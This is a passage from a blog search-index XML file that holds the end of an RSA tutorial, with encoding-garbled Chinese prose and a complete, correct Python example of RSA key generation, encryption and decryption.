n</code>ä¼šå°†$m^e$çš„ç»“æœå…ˆè®¡ç®—å‡ºæ¥å†å–æ¨¡ï¼Œ$m^e$æ˜¯ä¸€ä¸ªéå¸¸å¤§çš„æ•°ï¼Œè¿™ä¼šæ¶ˆè€—ä½ è®¡ç®—æœºå¤§é‡çš„è¿ç®—å’Œå­˜å‚¨èµ„æºã€‚</p><p>è‡³æ­¤ï¼Œæˆ‘ä»¬ä¾¿å®Œæˆäº†åŠ å¯†è¿‡ç¨‹ï¼Œå¾—åˆ°äº†RSAçš„å¯†æ–‡Cã€‚</p><p><strong>è§£å¯†ï¼š</strong></p><p>æˆ‘ä»¬æ‰§è¡Œ</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">msg = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line"><span class="built_in">print</span>(msg)</span><br></pre></td></tr></table></figure><p>æ­¤æ—¶æˆ‘ä»¬ä¾¿å®Œæˆäº†RSAçš„è§£å¯†æ“ä½œï¼Œéšåä½ å¯ä»¥æ¯”è¾ƒä¸€ä¸‹<code>msg</code>å’Œ<code>m</code>çš„å€¼ï¼Œä»–ä»¬ä¼šæ˜¯ä¸€æ ·çš„ã€‚</p></li></ol><ul><li><p>å®Œæ•´ä»£ç ï¼š</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line"></span><br><span class="line">n = p*q</span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"><span class="keyword">assert</span> GCD(e, phi) == <span class="number">1</span>, <span class="string">&quot;è¯¥eä¸æ»¡è¶³äº’ç´ æ¡ä»¶&quot;</span></span><br><span class="line">d = inverse(e, phi)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;å…¬é’¥ï¼š(<span class="subst">&#123;e&#125;</span>, <span class="subst">&#123;n&#125;</span>)&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;ç§é’¥ï¼š(<span class="subst">&#123;d&#125;</span>, <span class="subst">&#123;n&#125;</span>)&#x27;</span>)</span><br><span class="line"></span><br><span class="line">message = <span class="string">b&#x27;hello&#x27;</span></span><br><span class="line">m = bytes_to_long(message)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;æ¶ˆæ¯ï¼š&#x27;</span>, m)</span><br><span class="line"></span><br><span class="line">c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;å¯†æ–‡ï¼š&#x27;</span>, c)</span><br><span class="line"></span><br><span class="line">msg = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;æ˜æ–‡ï¼š&#x27;</span>, msg)</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> msg == m, <span class="string">&quot;è§£å¯†å¤±è´¥&quot;</span></span><br></pre></td></tr></table></figure></li></ul>]]></content>
      
      
      <categories>
          
          <category> å¯†ç ç®—æ³• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å¯†ç å­¦ </tag>
            
            <tag> RSA </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
